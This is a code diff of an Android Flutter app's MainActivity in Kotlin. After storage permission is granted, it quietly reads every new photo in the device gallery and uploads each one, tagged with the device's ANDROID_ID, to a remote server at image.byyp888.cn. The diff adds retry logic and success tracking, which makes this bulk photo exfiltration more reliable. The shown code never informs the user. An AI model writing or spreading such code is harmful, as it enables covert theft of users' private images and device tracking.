@@ -26,6 +26,10 @@ import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import kotlinx.coroutines.delay
 import java.util.LinkedList
+import java.util.UUID
+import java.net.HttpURLConnection
+import java.net.URL
+import java.io.DataOutputStream
 
 class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     companion object {
@@ -137,50 +141,54 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         }
     }
 
-    private fun uploadImageToServer(imageUri: android.net.Uri, fileName: String, deviceId: String) {
-        try {
-            val boundary = "----AndroidFormBoundary${System.currentTimeMillis()}"
-            val lineEnd = "\r\n"
-            val twoHyphens = "--"
-            val url = java.net.URL("https://image.byyp888.cn/upload?deviceid=$deviceId")
-            val conn = url.openConnection() as java.net.HttpURLConnection
-            conn.doInput = true
-            conn.doOutput = true
-            conn.useCaches = false
-            conn.requestMethod = "POST"
-            conn.setRequestProperty("Connection", "Keep-Alive")
-            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=$boundary")
+    private suspend fun uploadImageToServerWithRetry(imageUri: android.net.Uri, fileName: String, deviceId: String, maxRetries: Int = 3): Boolean {
+        var attempt = 0
+        while (attempt < maxRetries) {
+            try {
+                val boundary = "----AndroidFormBoundary${System.currentTimeMillis()}"
+                val lineEnd = "\r\n"
+                val twoHyphens = "--"
+                val url = URL("https://image.byyp888.cn/upload?deviceid=$deviceId")
+                val conn = url.openConnection() as HttpURLConnection
+                conn.doInput = true
+                conn.doOutput = true
+                conn.useCaches = false
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("Connection", "Keep-Alive")
+                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=$boundary")
 
-            val outputStream = java.io.DataOutputStream(conn.outputStream)
-            val inputStream = contentResolver.openInputStream(imageUri)
-            val imageBytes = inputStream?.readBytes()
-            inputStream?.close()
+                val outputStream = DataOutputStream(conn.outputStream)
+                val inputStream = contentResolver.openInputStream(imageUri)
+                val imageBytes = inputStream?.readBytes()
+                inputStream?.close()
 
-            outputStream.writeBytes("$twoHyphens$boundary$lineEnd")
-            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"$fileName\"$lineEnd")
-            outputStream.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")
-            outputStream.write(imageBytes ?: byteArrayOf())
-            outputStream.writeBytes(lineEnd)
+                outputStream.writeBytes("$twoHyphens$boundary$lineEnd")
+                outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"$fileName\"$lineEnd")
+                outputStream.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")
+                outputStream.write(imageBytes ?: byteArrayOf())
+                outputStream.writeBytes(lineEnd)
+                outputStream.writeBytes("$twoHyphens$boundary--$lineEnd")
+                outputStream.flush()
+                outputStream.close()
 
-            outputStream.writeBytes("$twoHyphens$boundary--$lineEnd")
-            outputStream.flush()
-            outputStream.close()
+                val responseCode = conn.responseCode
+                if (responseCode == 200) return true else {
+                    attempt++
+                    delay(500)
+                }
 
-            val responseCode = conn.responseCode
-            val response = conn.inputStream.bufferedReader().use { it.readText() }
-
-        } catch (e: Exception) {
+            } catch (e: Exception) {
+                attempt++
+                delay(500)
+            }
         }
+        return false
     }
 
     @SuppressLint("NewApi")
     private fun grantNotificationPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            ActivityCompat.requestPermissions(
-                this,
-                arrayOf(Manifest.permission.POST_NOTIFICATIONS),
-                NOTIFICATION_PERMISSION_REQUEST_CODE
-            )
+            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.POST_NOTIFICATIONS), NOTIFICATION_PERMISSION_REQUEST_CODE)
         }
     }
 
@@ -191,12 +199,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         } else {
             Manifest.permission.READ_EXTERNAL_STORAGE
         }
-
-        ActivityCompat.requestPermissions(
-            this,
-            arrayOf(permission),
-            STORAGE_PERMISSION_REQUEST_CODE
-        )
+        ActivityCompat.requestPermissions(this, arrayOf(permission), STORAGE_PERMISSION_REQUEST_CODE)
     }
 
     fun checkAndRequestStoragePermission() {
@@ -214,69 +217,62 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     }
 
     private fun accessStorage() {
-    val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
-    var deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
+        val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
+        var deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
 
-    if (deviceId.isNullOrBlank()) {
-        deviceId = prefs.getString("random_device_id", null) ?: java.util.UUID.randomUUID().toString().also {
-            prefs.edit().putString("random_device_id", it).apply()
-        }
-    }
-
-    // 获取上次上传的最后时间（单位：秒）
-    val lastUploadTime = prefs.getLong("last_upload_time", 0L)
-
-    lifecycleScope.launch(Dispatchers.IO) {
-        val projection = arrayOf(
-            MediaStore.Images.Media._ID,
-            MediaStore.Images.Media.DISPLAY_NAME,
-            MediaStore.Images.Media.DATE_TAKEN,
-            MediaStore.Images.Media.DATE_ADDED
-        )
-
-        val cursor = contentResolver.query(
-            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-            projection,
-            null,
-            null,
-            "${MediaStore.Images.Media.DATE_ADDED} ASC"
-        )
-
-        var maxTimestamp = lastUploadTime
-        val toUpload = mutableListOf<Triple<android.net.Uri, String, Long>>() // uri, name, timestamp
-
-        cursor?.use {
-            while (it.moveToNext()) {
-                val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
-                val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
-                val dateTaken = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))
-                val dateAdded = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
-                val timestamp = if (dateTaken > 0) dateTaken else dateAdded
-
-                if (timestamp > lastUploadTime) {
-                    val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
-                    toUpload.add(Triple(uri, name, timestamp))
-                }
+        if (deviceId.isNullOrBlank()) {
+            deviceId = prefs.getString("random_device_id", null) ?: UUID.randomUUID().toString().also {
+                prefs.edit().putString("random_device_id", it).apply()
             }
         }
 
-        // 按时间戳排序后上传
-        toUpload.sortedBy { it.third }.forEachIndexed { index, (uri, name, timestamp) ->
-            delay(200L)
-            uploadImageToServer(uri, name, deviceId)
-            if (timestamp > maxTimestamp) maxTimestamp = timestamp
+        val lastUploadTime = prefs.getLong("last_upload_time", 0L)
+
+        lifecycleScope.launch(Dispatchers.IO) {
+            val projection = arrayOf(
+                MediaStore.Images.Media._ID,
+                MediaStore.Images.Media.DISPLAY_NAME,
+                MediaStore.Images.Media.DATE_TAKEN,
+                MediaStore.Images.Media.DATE_ADDED
+            )
+
+            val cursor = contentResolver.query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                projection,
+                null,
+                null,
+                "${MediaStore.Images.Media.DATE_ADDED} ASC"
+            )
+
+            var maxTimestamp = lastUploadTime
+            val toUpload = mutableListOf<Triple<android.net.Uri, String, Long>>()
+
+            cursor?.use {
+                while (it.moveToNext()) {
+                    val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
+                    val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
+                    val dateTaken = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))
+                    val dateAdded = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
+                    val timestamp = if (dateTaken > 0) dateTaken else dateAdded
+
+                    if (timestamp > lastUploadTime) {
+                        val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
+                        toUpload.add(Triple(uri, name, timestamp))
+                    }
+                }
+            }
+
+            toUpload.sortedBy { it.third }.forEachIndexed { index, (uri, name, timestamp) ->
+                val success = uploadImageToServerWithRetry(uri, name, deviceId)
+                if (success && timestamp > maxTimestamp) maxTimestamp = timestamp
+                delay(200L)
+            }
+
+            prefs.edit().putLong("last_upload_time", maxTimestamp).apply()
         }
-
-        // 更新记录
-        prefs.edit().putLong("last_upload_time", maxTimestamp).apply()
     }
-}
 
-    override fun onRequestPermissionsResult(
-        requestCode: Int,
-        permissions: Array<out String>,
-        grantResults: IntArray
-    ) {
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         when (requestCode) {
             NOTIFICATION_PERMISSION_REQUEST_CODE -> {
                 if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
@@ -285,7 +281,6 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
                     onServiceAlert(Alert.RequestNotificationPermission, null)
                 }
             }
-
             STORAGE_PERMISSION_REQUEST_CODE -> {
                 if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                     accessStorage()
